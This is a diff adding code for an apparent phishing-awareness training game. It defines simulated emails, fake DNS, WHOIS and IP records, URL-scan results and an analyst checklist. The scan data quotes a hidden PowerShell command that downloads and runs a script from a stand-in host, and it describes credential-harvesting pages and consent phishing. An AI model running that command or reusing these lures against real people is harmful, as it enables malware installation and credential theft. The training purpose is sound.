+        subject: 'Statutory audit FY26 — HR documents list (needed by end of day tomorrow)',
+        body: [
+          'Dear Meera,',
+          'As discussed with Vikram on Monday, the list of HR documents required for the statutory audit is attached. We need the documents by end of day tomorrow, 30 October, to keep the audit timeline.',
+          'Please upload everything to the audit portal named in our engagement letter. Please do not email documents, particularly the payroll register and employee records.',
+          'Regards,\nNeha Kapoor\nKapoor & Co., Chartered Accountants'
+        ],
+        attachments: [{
+          name: 'HR_Document_List_FY26.xlsx', size: '38 KB', kind: 'xlsx', info: 'Excel workbook · 1 sheet · no macros',
+          pages: [['**HR documents required: statutory audit FY26**', '1. Payroll register, Apr 2025 to Mar 2026\n2. Headcount reconciliation\n3. Joiners and leavers list\n4. Gratuity and leave encashment workings\n5. PF and ESI challans\n6. Bonus computation\n7. Sample of employment contracts (10)\n8. Board-approved salary revision summary']]
+        }],
+        auth: { ip: '203.0.113.45', rp: 'neha.kapoor@kapoorco.example', dkim: ['kapoorco.example', 'selector1'] },
+        hint: 'M'
+      },
+      {
+        from: 'EPFO Employer Compliance <alerts@epfo-employer-alerts.example>',
+        to: 'Meera Iyer <meera.iyer@corvus.example>',
+        date: '29 Oct 2026, 12:15 PM',
+        subject: 'October ECR validation error — action needed within 24 hours',
+        body: [
+          'Dear Establishment Administrator,',
+          'The Electronic Challan cum Return (ECR) for Corvus Digital for October 2026 has a validation error in 3 member records. Unless the establishment re-authenticates and corrects the file within 24 hours, the filing will be marked defaulted and interest and damages may apply.',
+          'Re-authenticate your establishment login and review the errors: [Fix ECR errors]',
+          'EPFO Employer Compliance Desk'
+        ],
+        links: { 'Fix ECR errors': 'https://epfo-employer-alerts.example/ecr/fix' },
+        auth: { ip: '192.0.2.230', rp: 'alerts@epfo-employer-alerts.example', dkim: ['epfo-employer-alerts.example', 's1'] },
+        hint: 'A'
+      }
+    ]
+  }
+};
+
+/* ------------------------------------------------------------------
+ * The simulated internet: DNS (SPF, DKIM, DMARC), WHOIS, IP owners and
+ * URL scans. Public evidence only; it never states a verdict.
+ * ------------------------------------------------------------------ */
+const NET = {
+  spf: {
+    'northwind.example': 'v=spf1 include:_spf.mailcloud.example -all',
+    'corvus.example': 'v=spf1 include:_spf.mailcloud.example -all',
+    '_spf.mailcloud.example': 'v=spf1 ip4:203.0.113.0/26 -all',
+    'microsoft.example': 'v=spf1 include:_spf.microsoft.example -all',
+    'sharepoint.microsoft.example': 'v=spf1 include:_spf.microsoft.example -all',
+    'accountprotection.microsoft.example': 'v=spf1 include:_spf.microsoft.example -all',
+    '_spf.microsoft.example': 'v=spf1 ip4:203.0.113.64/27 -all',
+    'cloudvaultpro-services.example': 'v=spf1 ip4:192.0.2.96/28 -all',
+    'brightpay.example': 'v=spf1 ip4:198.51.100.64/28 include:_spf.mailcloud.example -all',
+    'lumenlogistics.example': 'v=spf1 include:_spf.mailcloud.example -all',
+    'orchidrewards.example': 'v=spf1 ip4:192.0.2.32/28 -all',
+    'meridianoffice.example': 'v=spf1 include:_spf.mailcloud.example -all',
+    'menon-associates.example': 'v=spf1 ip4:192.0.2.144/28 ~all',
+    'meetingfix-support.example': 'v=spf1 ip4:198.51.100.144/28 -all',
+    'gmail.example': 'v=spf1 include:_spf.gmail.example ~all',
+    '_spf.gmail.example': 'v=spf1 ip4:192.0.2.192/27 ~all',
+    'signflow.example': 'v=spf1 ip4:203.0.113.160/28 -all',
+    'mailer-calendar.example': 'v=spf1 ip4:198.51.100.96/28 -all',
+    'kapoorco.example': 'v=spf1 include:_spf.mailcloud.example -all',
+    'epfo-employer-alerts.example': 'v=spf1 ip4:192.0.2.224/28 -all',
+    'proton-mail.example': 'v=spf1 ip4:192.0.2.64/28 -all'
+  },
+  dmarc: {
+    'northwind.example': 'v=DMARC1; p=none; rua=mailto:dmarc-reports@northwind.example',
+    'corvus.example': 'v=DMARC1; p=none; rua=mailto:dmarc@corvus.example',
+    'microsoft.example': 'v=DMARC1; p=reject; pct=100',
+    'brightpay.example': 'v=DMARC1; p=reject; rua=mailto:dmarc@brightpay.example',
+    'lumenlogistics.example': 'v=DMARC1; p=quarantine',
+    'orchidrewards.example': 'v=DMARC1; p=reject',
+    'meridianoffice.example': 'v=DMARC1; p=quarantine',
+    'cloudvaultpro-services.example': 'v=DMARC1; p=none',
+    'meetingfix-support.example': 'v=DMARC1; p=none',
+    'gmail.example': 'v=DMARC1; p=none; sp=quarantine',
+    'signflow.example': 'v=DMARC1; p=reject',
+    'kapoorco.example': 'v=DMARC1; p=quarantine',
+    'epfo-employer-alerts.example': 'v=DMARC1; p=none',
+    'proton-mail.example': 'v=DMARC1; p=quarantine'
+  },
+  dkim: [
+    'nw2026._domainkey.northwind.example', 'crv1._domainkey.corvus.example',
+    'selector1._domainkey.microsoft.example', 'selector2._domainkey.microsoft.example',
+    'k1._domainkey.cloudvaultpro-services.example', 'bp1._domainkey.brightpay.example',
+    'selector1._domainkey.lumenlogistics.example', 'or2026._domainkey.orchidrewards.example',
+    'selector1._domainkey.meridianoffice.example', 'default._domainkey.menon-associates.example',
+    'mail._domainkey.meetingfix-support.example', '20230601._domainkey.gmail.example',
+    'sf1._domainkey.signflow.example', 'mc1._domainkey.mailer-calendar.example',
+    'selector1._domainkey.kapoorco.example', 's1._domainkey.epfo-employer-alerts.example'
+  ],
+  // domain: [created, registrar, registrant, country]
+  whois: {
+    'northwind.example': ['2002-03-14', 'IndiDomains Ltd', 'Northwind Systems Pvt Ltd', 'IN'],
+    'corvus.example': ['2012-06-02', 'IndiDomains Ltd', 'Corvus Digital Pvt Ltd', 'IN'],
+    'crv.example': ['2019-01-22', 'IndiDomains Ltd', 'Corvus Digital Pvt Ltd', 'IN'],
+    'microsoft.example': ['1991-05-02', 'MarkMonitor Example', 'Microsoft Example Corporation', 'US'],
+    'mailcloud.example': ['2004-09-30', 'MarkMonitor Example', 'MailCloud Corporation', 'US'],
+    'cloudvaultpro-services.example': ['2026-10-26', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'brightpay.example': ['2008-09-11', 'IndiDomains Ltd', 'BrightPay Payroll Ltd', 'IN'],
+    'lumenlogistics.example': ['2011-04-19', 'IndiDomains Ltd', 'Lumen Logistics Pvt Ltd', 'IN'],
+    'northwlnd.example': ['2026-10-27', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'orchidrewards.example': ['2014-08-05', 'IndiDomains Ltd', 'Orchid Rewards Pvt Ltd', 'IN'],
+    'meridianoffice.example': ['2006-02-27', 'IndiDomains Ltd', 'Meridian Office Supply Ltd', 'IN'],
+    'menon-associates.example': ['2026-10-21', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'account-verify.example': ['2026-10-22', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'finsync-viewer.example': ['2026-10-19', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'cheaphost.example': ['2010-03-03', 'EuroNames BV', 'CheapHost BV', 'NL'],
+    'quickvps.example': ['2015-07-12', 'AsiaReg Pte Ltd', 'QuickVPS Pte Ltd', 'SG'],
+    'meetingfix-support.example': ['2026-10-25', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'gmail.example': ['1997-08-13', 'MarkMonitor Example', 'Gmail Example Inc (free webmail)', 'US'],
+    'signflow.example': ['2015-03-30', 'MarkMonitor Example', 'SignFlow Inc', 'US'],
+    'proton-mail.example': ['2014-05-16', 'EuroNames BV', 'Proton Mail Example AG (free webmail)', 'CH'],
+    'ananyarao-portfolio.example': ['2026-10-23', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'mailer-calendar.example': ['2026-10-20', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'corvus-hr-share.example': ['2026-10-26', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'kapoorco.example': ['2009-07-08', 'IndiDomains Ltd', 'Kapoor & Co. Chartered Accountants', 'IN'],
+    'epfo-employer-alerts.example': ['2026-10-24', 'NameCheapo Registrar', 'REDACTED FOR PRIVACY', 'IS'],
+    'webcastly.example': ['2016-11-14', 'MarkMonitor Example', 'Webcastly Inc', 'US']
+  },
+  // [cidr, owner, country, reverse-DNS pattern ({n} = last octet)]
+  nets: [
+    ['203.0.113.0/26', 'MailCloud Corporation (business email hosting)', 'US', 'mail-out-{n}.mailcloud.example'],
+    ['203.0.113.64/27', 'Microsoft Example Corporation', 'US', 'mail-{n}.outbound.microsoft.example'],
+    ['203.0.113.160/28', 'SignFlow Inc', 'US', 'mta{n}.signflow.example'],
+    ['198.51.100.64/28', 'BrightPay Payroll Ltd', 'IN', 'smtp{n}.brightpay.example'],
+    ['198.51.100.96/28', 'CheapHost BV (rented VPS servers)', 'NL', 'relay{n}.mailer-calendar.example'],
+    ['198.51.100.144/28', 'CheapHost BV (rented VPS servers)', 'NL', 'vps-{n}.cheaphost.example'],
+    ['198.51.100.192/26', 'CheapHost BV (rented VPS servers)', 'NL', 'vps-{n}.cheaphost.example'],
+    ['192.0.2.32/28', 'Orchid Rewards Pvt Ltd', 'IN', 'mail{n}.orchidrewards.example'],
+    ['192.0.2.64/28', 'Proton Mail Example AG', 'CH', 'mail{n}.proton-mail.example'],
+    ['192.0.2.96/28', 'QuickVPS Pte Ltd (rented VPS servers)', 'SG', 'vps{n}.quickvps.example'],
+    ['192.0.2.144/28', 'QuickVPS Pte Ltd (rented VPS servers)', 'SG', 'vps{n}.quickvps.example'],
+    ['192.0.2.192/27', 'Gmail Example Inc (free webmail)', 'US', 'mail-{n}.gmail.example'],
+    ['192.0.2.224/28', 'QuickVPS Pte Ltd (rented VPS servers)', 'SG', 'vps{n}.quickvps.example']
+  ],
+  scans: {
+    'https://login.microsoft.example/oauth2/authorize?client_id=7f3a9c41-0d2b-4e8a-b6f1-93c0a5d42e1c&response_type=code&redirect_uri=https://finsync-viewer.example/callback&scope=Mail.ReadWrite%20Files.ReadWrite.All%20offline_access': {
+      title: 'Sign in to your account | Microsoft',
+      page: ['Genuine Microsoft sign-in page. After sign-in it shows an app approval screen:', '"FinSync Viewer (unverified publisher) wants to: read and write your mail; read and write all files you can access; maintain access to data you have given it access to."', 'Buttons: Accept, Cancel. After Accept, the browser is sent to https://finsync-viewer.example/callback with an access code.']
+    },
+    'https://mysignins.microsoft.example': { title: 'My Sign-Ins | Microsoft', page: ['Microsoft account sign-in activity page. Uses your existing Microsoft 365 session.', 'Lists recent sign-ins with time, device and location. No form fields on the page.'] },
+    'https://northwind.orchidrewards.example/redeem?t=ab41': {
+      redirects: ['https://login.northwind.example/sso?app=orchidrewards'],
+      title: 'Northwind Systems | Sign in',
+      page: ['Northwind single sign-on page hosted on login.northwind.example.', 'After sign-in, returns to an Orchid Rewards brand picker. No new password is requested.']
+    },
+    'https://northwind.sharepoint.example.account-verify.example/s/Finance/Q4_Variance_Rev3': {
+      title: 'Sign in to SharePoint',
+      page: ['SharePoint-style sign-in page with the Northwind logo.', 'Form fields: email address, password. The form submits to https://account-verify.example/collect.php']
+    },
+    'https://login.corvus.example/changepassword': { redirects: ['https://login.corvus.example/sso?return=changepassword'], title: 'Corvus Digital | Sign in', page: ['Corvus single sign-on page. After sign-in, shows "Change password" with current and new password fields.'] },
+    'https://meetingfix-support.example/verify': {
+      title: 'Teams Audio Diagnostics',
+      page: ['Shows a "Verify you are human" checkbox styled like a CAPTCHA.', 'Clicking it silently copies this text to the clipboard: powershell -w hidden -c "iwr https://meetingfix-support.example/a.ps1 | iex"', 'The page then says: press Windows key + R, paste with Ctrl+V, press Enter.']
+    },
+    'https://crv.example/go/allhands-q3': { redirects: ['https://corvus.webcastly.example/q3'], title: 'Webcastly | Corvus Digital Q3 Results All-Hands', page: ['Event registration form with one field: Name.', 'No password or email field. Event: Friday 30 October 2026, 4:00 PM IST.'] },
+    'https://app.signflow.example/review/9f2e81c4d7': {
+      title: 'SignFlow | Review document',
+      page: ['"Aditi Verma (aditi.verma.comp@proton-mail.example) sent you Salary_Revision_Letter_FY27.pdf."', 'The document is blurred. Button: "Sign in with Microsoft to view".']
+    },
+    'https://ananyarao-portfolio.example/view': {
+      title: 'Ananya Rao | Portfolio',
+      page: ['Page shows: "Sign in with your work Microsoft account to view protected case studies."', 'Form fields: work email, password. The form submits to https://ananyarao-portfolio.example/auth']
+    },
+    'https://hrms.corvus.example/approvals': { redirects: ['https://login.corvus.example/sso?app=hrms'], title: 'Corvus Digital | Sign in', page: ['Corvus single sign-on page. After sign-in, opens the HRMS approvals queue.'] },
+    'https://corvus-hr-share.example/bands': { title: 'Sign in to view shared document', page: ['Microsoft-style sign-in page with the Corvus logo.', 'Form fields: email, password. The form submits to https://corvus-hr-share.example/login']},
+    'https://corvus-hr-share.example/join/7741': { title: 'Sign in to join meeting', page: ['Microsoft-style sign-in page with the Corvus logo.', 'Form fields: email, password. The form submits to https://corvus-hr-share.example/login'] },
+    'https://epfo-employer-alerts.example/ecr/fix': { title: 'EPFO Employer e-Sewa Portal', page: ['Copy of a government employer login page.', 'Form fields: Establishment ID, password, captcha. The form submits to https://epfo-employer-alerts.example/ecr/auth'] }
+  }
+};
+
+const CHECKLIST = [
+  'Who really sent it? Compare the display name with the actual address, the Reply-To and the Return-Path. Your company\'s domain is the one in your own address.',
+  'Where does the link really go? Hover over it (or click it) to see the real destination, and read the host name from right to left.',
+  'What does it ask you to do? Sign in, approve access, scan a code, call a number, run something, change bank details or open a locked file.',
+  'Is there pressure? Odd hours, short deadlines and threats push you to skip checks.',
+  'Does it give you a safe route? Genuine emails usually let you go to the system yourself instead of using their link.',
+  'A PASS only proves the email came from that domain, not that the domain is honest. Check how old the domain is.'
+];
+const HOWTO = [
+  'Open the email, then **⋮ → Show original** to see the raw headers.',
+  '**SPF:** in the Received line added by your own mail server (by mx1…), copy the sender\'s IP from the square brackets. Take the domain from Return-Path. Run **Lookup → SPF test**.',
+  '**DKIM:** in the DKIM-Signature header, note **d=** (domain) and **s=** (selector). Run **Lookup → DKIM** while the email is open.',
+  '**DMARC:** does the From: domain match the domain that passed SPF or DKIM? If not, DMARC fails. Look up the From domain\'s DMARC policy to see whether it would be blocked.',
+  '**WHOIS, IP lookup and URL scan:** how old is the domain, who owns the sending server, and what does the link\'s page really do?'
+];
+
+/* Encrypted debrief payloads, injected by build.js. */
+const PAYLOADS = /*@@PAYLOADS@@*/null;
+
+const STORE_KEY = 'phish-or-legit:v2';
+const MAX_TRIES = 5;
+const COOLDOWN_MS = 30000;
+const TODAY = Date.UTC(2026, 9, 29);
+const AVATAR_COLORS = ['#3157c8', '#8a3fb8', '#0f7a6c', '#b2511f', '#7a5c00', '#a8315a', '#2d6e2d', '#5a54c4', '#0b6f9c', '#9a3b3b'];
+
+const $ = (sel, root = document) => root.querySelector(sel);
+const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
+const el = (tag, attrs, ...kids) => {
+  const n = document.createElement(tag);
+  if (attrs) for (const [k, v] of Object.entries(attrs)) {
+    if (v == null || v === false) continue;
+    if (k === 'class') n.className = v;
+    else n.setAttribute(k, v === true ? '' : v);
+  }
+  for (const kid of kids.flat()) if (kid != null && kid !== false) n.append(kid);
+  return n;
+};
+function icon(paths, cls = 'i') {
+  const ns = 'http://www.w3.org/2000/svg';
+  const svg = document.createElementNS(ns, 'svg');
+  svg.setAttribute('class', cls); svg.setAttribute('viewBox', '0 0 24 24'); svg.setAttribute('aria-hidden', 'true');
+  for (const d of [].concat(paths)) { const p = document.createElementNS(ns, 'path'); p.setAttribute('d', d); svg.append(p); }
+  return svg;
+}
+
+/* ---------------- State (sessionStorage: no password, no payload) ---------------- */
+const fresh = () => ({ screen: 'landing', setId: null, team: '', startedAt: null, marks: {}, read: [], selected: 0, attempts: 0, streak: 0, cooldownUntil: 0, solved: null, sideTab: 'lookup' });
+function load() {
+  try {
+    const s = JSON.parse(sessionStorage.getItem(STORE_KEY) || 'null');
+    if (!s || (s.screen !== 'landing' && !SETS[s.setId])) return null;
+    const st = Object.assign(fresh(), s);
+    if (st.screen === 'result') st.screen = 'game';
+    return st;
+  } catch (e) { return null; }
+}
+function save() { try { sessionStorage.setItem(STORE_KEY, JSON.stringify(state)); } catch (e) { /* storage unavailable */ } }
+
+let state = load() || fresh();
+let unlocked = null;     // { word, data } kept in memory only
+let checking = false;
+let lastCooldownActive = false;
+let viewMode = 'message'; // or 'original'
+
+const set = () => SETS[state.setId];
+const markedCount = () => Object.keys(state.marks).length;
+const isCooling = () => Date.now() < state.cooldownUntil;
+
+/* ---------------- Helpers ---------------- */
+function parseAddr(s) {
+  const m = /^(.*?)\s*<([^>]+)>$/.exec(s || '');
+  return m ? { name: m[1], addr: m[2] } : { name: s, addr: s };
+}
+const domainOf = addr => String(addr).split('@').pop().toLowerCase();
+const regDomain = host => host.toLowerCase().split('.').slice(-2).join('.');
+function initials(name) {
+  const parts = name.replace(/[^A-Za-z ]/g, ' ').trim().split(/\s+/).filter(Boolean);
+  return ((parts[0] || '?')[0] + (parts.length > 1 ? parts[parts.length - 1][0] : '')).toUpperCase();
+}
+function avatar(name, i) { return el('span', { class: 'avatar', 'aria-hidden': 'true', style: 'background:' + AVATAR_COLORS[i % AVATAR_COLORS.length] }, initials(name)[0]); }
+function fmtTime(ms) {
+  const s = Math.max(0, Math.floor(ms / 1000));
+  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
+  const pad = n => String(n).padStart(2, '0');
+  return (h ? h + ':' + pad(m) : pad(m)) + ':' + pad(sec);
+}
+function fmtTimeLong(ms) { const s = Math.max(0, Math.floor(ms / 1000)); const m = Math.floor(s / 60); return (m ? m + ' min ' : '') + (s % 60) + ' s'; }
+const plain = str => str.replace(/\*\*/g, '').replace(/\[([^\]]+)\]/g, '$1').replace(/\n/g, ' ');
+
+/* Deterministic pseudo-random strings for header IDs and signatures. */
+function hash(str) { let h = 2166136261; for (let i = 0; i < str.length; i++) { h ^= str.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; }
+function randStr(seed, len, alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/') {
+  let x = hash(seed) || 1, out = '';
+  for (let i = 0; i < len; i++) { x ^= x << 13; x ^= x >>> 17; x ^= x << 5; x >>>= 0; out += alphabet[x % alphabet.length]; }
+  return out;
+}
+const hex = (seed, len) => randStr(seed, len, '0123456789abcdef');
+
+/* "29 Oct 2026, 09:12 AM" -> RFC 5322 date in IST */
+function rfcDate(d, sec) {
+  const m = /(\d+) (\w{3}) (\d{4}), (\d{2}):(\d{2}) (AM|PM)/.exec(d);
+  if (!m) return d;
+  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+  let h = Number(m[4]) % 12; if (m[6] === 'PM') h += 12;
+  const dow = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][new Date(Date.UTC(+m[3], months.indexOf(m[2]), +m[1])).getUTCDay()];
+  return `${dow}, ${+m[1]} ${m[2]} ${m[3]} ${String(h).padStart(2, '0')}:${m[5]}:${String(sec).padStart(2, '0')} +0530`;
+}
+
+/* ---------------- Simulated network ---------------- */
+function ipToInt(ip) { const p = ip.split('.').map(Number); if (p.length !== 4 || p.some(n => !(n >= 0 && n <= 255))) return null; return ((p[0] << 24) >>> 0) + (p[1] << 16) + (p[2] << 8) + p[3]; }
+function inCidr(ip, cidr) {
+  const [base, bits = '32'] = cidr.split('/');
+  const a = ipToInt(ip), b = ipToInt(base);
+  if (a == null || b == null) return false;
+  const mask = Number(bits) === 0 ? 0 : (~0 << (32 - Number(bits))) >>> 0;
+  return ((a & mask) >>> 0) === ((b & mask) >>> 0);
+}
+function netFor(ip) { return NET.nets.find(n => inCidr(ip, n[0])); }
+function ptrFor(ip) { const n = netFor(ip); return n ? n[3].replace('{n}', ip.split('.')[3]) : 'unknown'; }
+function dkimKey(name) { return 'v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA' + randStr(name, 300) + 'IDAQAB'; }
+function daysOld(created) { const [y, m, d] = created.split('-').map(Number); return Math.round((TODAY - Date.UTC(y, m - 1, d)) / 86400000); }
+function ageText(created) {
+  const days = daysOld(created);
+  if (days < 60) return days + (days === 1 ? ' day' : ' days') + ' before today';
+  const years = Math.floor(days / 365.25);
+  return years >= 1 ? 'about ' + years + (years === 1 ? ' year' : ' years') + ' ago' : Math.round(days / 30) + ' months ago';
+}
+
+function spfEval(domain, ip, out, depth) {
+  const pad = '  '.repeat(depth);
+  const rec = NET.spf[domain];
+  if (!rec) { out.push(pad + domain + '  (no SPF record)'); return 'none'; }
+  out.push(pad + domain + '  "' + rec + '"');
+  if (depth > 5) return 'permerror';
+  for (const term of rec.split(/\s+/).slice(1)) {
+    let q = '+', t = term;
+    if ('+-~?'.includes(t[0])) { q = t[0]; t = t.slice(1); }
+    const res = { '+': 'pass', '-': 'fail', '~': 'softfail', '?': 'neutral' }[q];
+    if (t.startsWith('ip4:')) {
+      const hit = inCidr(ip, t.slice(4));
+      out.push(pad + '  ' + term + (hit ? '  matches ' + ip : '  no match'));
+      if (hit) return res;
+    } else if (t.startsWith('include:')) {
+      out.push(pad + '  ' + term);
+      const r = spfEval(t.slice(8), ip, out, depth + 2);
+      if (r === 'pass') { out.push(pad + '  include matched'); return res; }
+      out.push(pad + '  include did not match');
+    } else if (t === 'all') {
+      out.push(pad + '  ' + term + '  matches everything left → ' + res);
+      return res;
+    }
+  }
+  return 'neutral';
+}
+
+function cleanDomain(v) {
+  let s = String(v || '').trim().toLowerCase();
+  s = s.replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/^<|>$/g, '').replace(/\.$/, '');
+  if (s.includes('@')) s = s.split('@').pop();
+  return s;
+}
+
+/* Each lookup returns an array of lines: strings or [text, cls]. */
+const LOOKUPS = {
+  spftest: {
+    a: 'Domain (from Return-Path)', b: 'Sending IP address',
+    help: 'Checks whether an IP is allowed to send mail for a domain, following includes like a real SPF checker.',
+    run(a, b) {
+      const d = cleanDomain(a), ip = String(b || '').trim().replace(/[[\]]/g, '');
+      if (!d) return [['Enter a domain.', 'warn']];
+      if (ipToInt(ip) == null) return [['Enter an IPv4 address, for example 203.0.113.10.', 'warn']];
+      const out = ['SPF test: is ' + ip + ' allowed to send for ' + d + '?', ''];
+      const r = spfEval(d, ip, out, 0);
+      out.push('');
+      const msg = { pass: 'PASS: ' + ip + ' is authorised to send mail for ' + d, fail: 'FAIL: ' + ip + ' is NOT authorised to send mail for ' + d, softfail: 'SOFTFAIL: ' + ip + ' is probably not authorised for ' + d, neutral: 'NEUTRAL: the record makes no statement about ' + ip, none: 'NONE: ' + d + ' publishes no SPF record', permerror: 'PERMERROR: too many includes' }[r];
+      out.push([msg, r === 'pass' ? 'ok' : r === 'fail' || r === 'softfail' ? 'bad' : 'warn']);
+      return out;
+    }
+  },
+  spf: {
+    a: 'Domain', help: 'Shows the SPF TXT record a domain publishes.',
+    run(a) {
+      const d = cleanDomain(a);
+      if (!d) return [['Enter a domain.', 'warn']];
+      const rec = NET.spf[d];
+      return rec ? ['TXT ' + d, '', '"' + rec + '"', '', 'Tip: use SPF test with the sending IP to evaluate it.'] : ['TXT ' + d, '', ['No SPF record found.', 'warn']];
+    }
+  },
+  dkim: {
+    a: 'Domain (d= value)', b: 'Selector (s= value)',
+    help: 'Fetches the public key at selector._domainkey.domain and checks the DKIM-Signature on the email that is open.',
+    run(a, b) {
+      const d = cleanDomain(a), s = String(b || '').trim().toLowerCase();
+      if (!d || !s) return [['Enter both the d= domain and the s= selector.', 'warn']];
+      const name = s + '._domainkey.' + d;
+      const out = ['TXT ' + name, ''];
+      const has = NET.dkim.includes(name);
+      out.push(has ? '"' + dkimKey(name) + '"' : ['No DKIM key published at this name.', 'bad']);
+      out.push('');
+      const e = currentEmail();
+      if (!e) return out;
+      const sig = e.auth.dkim;
+      const label = 'Open email (Email ' + (state.selected + 1) + '): ';
+      if (!sig) out.push([label + 'has no DKIM-Signature header, so DKIM = none.', 'bad']);
+      else if (sig[0] !== d || sig[1] !== s) out.push([label + 'is not signed with d=' + d + '; s=' + s + '. Check the DKIM-Signature header again.', 'warn']);
+      else if (has) out.push([label + 'signature verified with this key: DKIM PASS for ' + d, 'ok']);
+      else out.push([label + 'key not found, so the signature cannot be verified: DKIM FAIL', 'bad']);
+      return out;
+    }
+  },
+  dmarc: {
+    a: 'Domain (from the From: address)', help: 'DMARC passes only when SPF or DKIM passes for a domain that matches the From: domain. The policy (p=) says what to do with failures.',
+    run(a) {
+      const d = cleanDomain(a);
+      if (!d) return [['Enter a domain.', 'warn']];
+      const org = regDomain(d);
+      const rec = NET.dmarc[d] || NET.dmarc[org];
+      const out = ['TXT _dmarc.' + (NET.dmarc[d] ? d : org), ''];
+      if (!rec) { out.push(['No DMARC record. Failures are not reported or blocked.', 'warn']); return out; }
+      out.push('"' + rec + '"', '');
+      const p = (/p=(\w+)/.exec(rec) || [])[1];
+      out.push({ none: 'p=none: monitoring only. Mail that fails DMARC is still delivered.', quarantine: 'p=quarantine: mail that fails DMARC goes to spam.', reject: 'p=reject: mail that fails DMARC is refused.' }[p] || '');
+      return out;
+    }
+  },
+  whois: {
+    a: 'Domain', help: 'Shows when a domain was registered and who owns it. Brand-new domains are a common sign of phishing.',
+    run(a) {
+      const d = cleanDomain(a);
+      if (!d) return [['Enter a domain.', 'warn']];
+      const reg = regDomain(d), w = NET.whois[reg];
+      if (!w) return ['WHOIS ' + reg, '', ['No WHOIS data in the training environment.', 'warn']];
+      const young = daysOld(w[0]) < 60;
+      return ['WHOIS ' + reg, '', 'Created:    ' + w[0], ['Age:        ' + ageText(w[0]), young ? 'bad' : 'ok'], 'Registrar:  ' + w[1], 'Registrant: ' + w[2], 'Country:    ' + w[3]];
+    }
+  },
+  ip: {
+    a: 'IP address', help: 'Shows who owns an IP address and its reverse DNS name.',
+    run(a) {
+      const ip = String(a || '').trim().replace(/[[\]]/g, '');
+      if (ipToInt(ip) == null) return [['Enter an IPv4 address.', 'warn']];
+      const n = netFor(ip);
+      if (!n) return ['IP ' + ip, '', ['Not found in the training environment.', 'warn']];
+      return ['IP ' + ip, '', 'Reverse DNS: ' + ptrFor(ip), 'Network:     ' + n[0], 'Owner:       ' + n[1], 'Country:     ' + n[2]];
+    }
+  },
+  url: {
+    a: 'URL', help: 'Opens a link safely in a sandbox and reports redirects and what the page shows. Tip: click any link in an email and choose Scan.',
+    run(a) {
+      const url = String(a || '').trim();
+      if (!url) return [['Enter a URL.', 'warn']];
+      const sc = NET.scans[url] || NET.scans[url.replace(/\/$/, '')];
+      let host = '';
+      try { host = new URL(/^[a-z]+:\/\//i.test(url) ? url : 'https://' + url).hostname; } catch (e) { return [['That does not look like a URL.', 'warn']]; }
+      const out = ['URL scan', '', 'Submitted:  ' + url];
+      const finalUrl = sc && sc.redirects ? sc.redirects[sc.redirects.length - 1] : url;
+      if (sc && sc.redirects) sc.redirects.forEach(r => out.push('Redirect →  ' + r));
+      let finalHost = host; try { finalHost = new URL(finalUrl).hostname; } catch (e) { /* keep */ }
+      const reg = regDomain(finalHost), w = NET.whois[reg];
+      out.push('Final host: ' + finalHost, 'Registered domain: ' + reg + (w ? '  (created ' + w[0] + ', ' + ageText(w[0]) + ')' : ''));
+      if (!sc) { out.push('', ['No page capture for this URL in the training environment.', 'warn']); return out; }
+      out.push('', 'Page title: ' + sc.title, 'What the page shows:');
+      sc.page.forEach(p => out.push('  • ' + p));
+      return out;
+    }
+  }
+};
+
+function renderLookupForm() {
+  const t = LOOKUPS[$('#lk-type').value];
+  $('#lk-a-label').textContent = t.a;
+  $('#lk-b-wrap').hidden = !t.b;
+  if (t.b) $('#lk-b-label').textContent = t.b;
+  $('#lk-help').textContent = t.help;
+}
+function runLookup() {
+  const t = LOOKUPS[$('#lk-type').value];
+  const lines = t.run($('#lk-a').value, $('#lk-b').value);
+  const out = $('#lk-out');
+  out.textContent = '';
+  lines.forEach((l, i) => {
+    if (i) out.append('\n');
+    if (Array.isArray(l)) out.append(el('span', { class: l[1] }, l[0])); else out.append(l);
+  });
+}
+
+/* ---------------- Rich text (inert links) ---------------- */
+function richText(str, links) {
+  const frag = document.createDocumentFragment();
+  const re = /(\*\*[^*]+\*\*|\[[^\]]+\]|https?:\/\/[^\s]+|\n)/g;
+  let last = 0, m;
+  while ((m = re.exec(str))) {
+    if (m.index > last) frag.append(str.slice(last, m.index));
+    const tok = m[0];
+    if (tok === '\n') frag.append(el('br'));
+    else if (tok.startsWith('**')) frag.append(el('strong', null, tok.slice(2, -2)));
+    else if (tok.startsWith('[')) {
+      const label = tok.slice(1, -1);
+      if (label === 'QR CODE IMAGE') frag.append(qrPlaceholder());
+      else frag.append(inertLink(label, (links || {})[label], 'ibtn'));
+    } else frag.append(inertLink(tok, (links || {})[tok] || tok, 'ilink'));
+    last = m.index + tok.length;
+  }
+  if (last < str.length) frag.append(str.slice(last));
+  return frag;
+}
+function inertLink(text, href, cls) {
+  return el('button', { type: 'button', class: cls, 'data-href': href || '', 'aria-label': text + (href ? '. Link to ' + href : '') + '. Links are disabled in this game.' }, text);
+}
+
+/* Decorative QR-like picture. Not a real code: it cannot be scanned. */
+function qrPlaceholder() {
+  const n = 21, cells = [];
+  let seed = 7;
+  const rnd = () => (seed = (seed * 9301 + 49297) % 233280) / 233280;
